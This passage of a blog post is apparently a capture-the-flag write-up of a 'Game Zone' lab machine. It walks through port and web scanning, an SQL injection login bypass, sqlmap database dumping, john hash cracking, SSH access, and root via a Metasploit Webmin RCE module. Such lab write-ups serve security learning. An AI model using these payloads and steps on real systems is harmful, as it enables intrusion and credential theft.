<pre class="chroma"><code class="language-text" data-lang="text">Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-22 11:38 CET
Nmap scan report for $target_ip
Host is up (0.033s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Game Zone
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=2/22%OT=22%CT=1%CU=42887%PV=Y%DS=2%DC=T%G=Y%TM=603389C
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=105%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
OS:1NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   33.34 ms 10.11.0.1
2   33.56 ms $target_ip

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.63 seconds
</code></pre></td></tr></table>
</div>
</div><p>Not much to see here : <code>Apache/2.4.18</code>, and <code>ssh</code>. Not much in <code>searchsploit</code> either. Let&rsquo;s directly run our usual web scanners and manually browse the website with <code>Burp</code> in the meantime.</p>
<h3 id="web-scanning">Web scanning</h3>
<p>First <code>nikto</code> :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">nikto -h http://$target_ip
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          $target_ip
+ Target Hostname:    $target_ip
+ Target Port:        80
+ Start Time:         2021-02-22 11:52:39 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Cookie PHPSESSID created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ IP address found in the &#39;location&#39; header. The IP is &#34;127.0.1.1&#34;.
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is &#34;127.0.1.1&#34;.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7863 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2021-02-22 11:58:11 (GMT1) (332 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
</code></pre></td></tr></table>
</div>
</div><p>Then <code>gobuster</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">gobuster dir -u http://$target_ip -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 200 -x .php
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://$target_ip
[+] Threads:        200
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2021/02/22 11:53:03 Starting gobuster
===============================================================
/portal.php (Status: 302)
/index.php (Status: 200)
/images (Status: 301)
===============================================================
2021/02/22 11:53:48 Finished
===============================================================
</code></pre></td></tr></table>
</div>
</div><p>Like we could guess, there is not much information from our scanners.</p>
<p>However, manual browsing revealed a <code>login and a search form</code>. Since we are working on <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank" rel="noopener noreferrer">SQLi</a>, they are most probably vulnerable!</p>
<p>It doesn&rsquo;t seem the search function is working (none of our request displayed in Burp show the search term), and we&rsquo;ll try to exploit the authentication box.</p>
<h2 id="exploitation">Exploitation</h2>
<p>Let&rsquo;s just try to use <code>' or 1=1 -- </code> (there is an <a href="https://portswigger.net/web-security/sql-injection/cheat-sh" target="_blank" rel="noopener noreferrer">extra space at the end</a> as username and a blank password, and we are in!</p>
<p></p>
<p>We now access to another search function, which this time, seems to be working, because this time, we notice that the search term in our Burp Request :</p>
<p></p>
<p>We will save this request as <code>req.txt</code> for a latter use.</p>
<p>It is now time to use our new saved request, in order to try to dump the credentials :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">sqlmap -r req.txt
</code></pre></td></tr></table>
</div>
</div><p>It will quickly tell us the DB appears to be <code>MySQL</code>. Cancel this scan and launch it again with the new gathered info in order to dump the DB :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">sqlmap -r req.txt --dbms=mysql --dump
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>We now save our hash into hash.txt, and we can use various <a href="https://md5decrypt.net/en/" target="_blank" rel="noopener noreferrer">online resources</a> to detect the hash type. OUr is <code>SHA256</code>.</p>
<p>Then we run :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
</code></pre></td></tr></table>
</div>
</div><p>And it&rsquo;ll give us the password :</p>
<p></p>
<h3 id="getting-initial-shell">Getting Initial Shell</h3>
<p>We can now log in via SSH with our new-found credentials :</p>
<p></p>
<p>Let&rsquo;s harvest user flag :</p>
<p></p>
<h3 id="privesc">PrivEsc</h3>
<p>As usual, I&rsquo;ll upload <code>lse.sh</code> on the server and run it in order to see if there is anything I could exploit to elevate my privileges. I didn&rsquo;t find anything obvious, so I&rsquo;ll now upload and run <code>linpeas.sh</code> as well!</p>
<p>We notice that <code>webmin</code> is installed and version is <code>1.580</code>, which is vulnerable to <code>RCE</code>!</p>
<p></p>
<p>NB : <code>webmin</code> being a tool for system administration via a website, it might be a great place to start looking.</p>
<p>First, we will set up an SSH tunnel in order to access <code>Webmin</code> from our attacking box :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">ssh -L 10000:127.0.0.1:10000 username@$target_ip
</code></pre></td></tr></table>
</div>
</div><p>Then, we can check it worked with <code>curl -I 127.0.0.1:10000</code> which should returns a <code>200</code> status code.</p>
<p>As far, as I&rsquo;d like to complete this without <code>MetaSploit</code>, it seems I am stuck! I found <a href="https://github.com/roughiz/Webmin-1.910-Exploit-Script" target="_blank" rel="noopener noreferrer">this repo</a>, for a manual exploitation. However, it is a Python2 script, and it seems some modules are deprecated&hellip; which might why I am not able to connect back to my listener :</p>
<p></p>
<p>So&hellip; We now, run <code>msfconsole</code> and use <code>unix/webapp/webmin_show_cgi_exec</code>, set the required options and run it. Boom! We have a shell :</p>
<p></p>
<p>And we harvest our root flag :</p>
<p></p>
<h2 id="outro">Outro</h2>
<p>Another fun box, and the first to have some &ldquo;real&rdquo; web vuln! One could argue that misconfiguration is also totally a &ldquo;real&rdquo; vuln, it was refreshing to see a more generic way to break in.</p>
]]></description></item></channel></rss>